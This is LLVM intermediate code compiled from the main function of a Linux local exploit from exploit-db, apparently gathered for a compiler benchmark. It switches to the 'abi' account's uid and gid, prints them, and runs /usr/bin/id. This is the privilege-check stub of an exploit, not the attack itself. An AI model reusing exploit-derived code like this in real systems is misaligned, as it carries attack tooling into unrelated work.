; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_30839.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_30839.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.passwd = type { i32, i32 }

@.str = private unnamed_addr constant [4 x i8] c"abi\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"my gid: %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"my uid: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"/usr/bin/id\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.passwd*, align 8
  %3 = alloca i32*, align 8
  %4 = alloca [25 x i8], align 16
  store i32 0, i32* %1, align 4
  %5 = call %struct.passwd* @getpwnam(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  store %struct.passwd* %5, %struct.passwd** %2, align 8
  %6 = load %struct.passwd*, %struct.passwd** %2, align 8
  %7 = getelementptr inbounds %struct.passwd, %struct.passwd* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 4
  %9 = call i32 @setgid(i32 %8)
  %10 = load %struct.passwd*, %struct.passwd** %2, align 8
  %11 = getelementptr inbounds %struct.passwd, %struct.passwd* %10, i32 0, i32 0
  %12 = load i32, i32* %11, align 4
  %13 = call i32 @setuid(i32 %12)
  %14 = call i32 (...) @getegid()
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 %14)
  %16 = call i32 (...) @getuid()
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32 %16)
  %18 = call i32* @popen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %18, i32** %3, align 8
  br label %19

19:                                               ; preds = %24, %0
  %20 = getelementptr inbounds [25 x i8], [25 x i8]* %4, i64 0, i64 0
  %21 = load i32*, i32** %3, align 8
  %22 = call i64 @fgets(i8* %20, i32 25, i32* %21)
  %23 = icmp ne i64 %22, 0
  br i1 %23, label %24, label %27

24:                                               ; preds = %19
  %25 = getelementptr inbounds [25 x i8], [25 x i8]* %4, i64 0, i64 0
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %25)
  br label %19

27:                                               ; preds = %19
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  %29 = load i32*, i32** %3, align 8
  %30 = call i32 @pclose(i32* %29)
  %31 = load i32, i32* %1, align 4
  ret i32 %31
}

declare dso_local %struct.passwd* @getpwnam(i8*) #1

declare dso_local i32 @setgid(i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getegid(...) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32* @popen(i8*, i8*) #1

declare dso_local i64 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @pclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
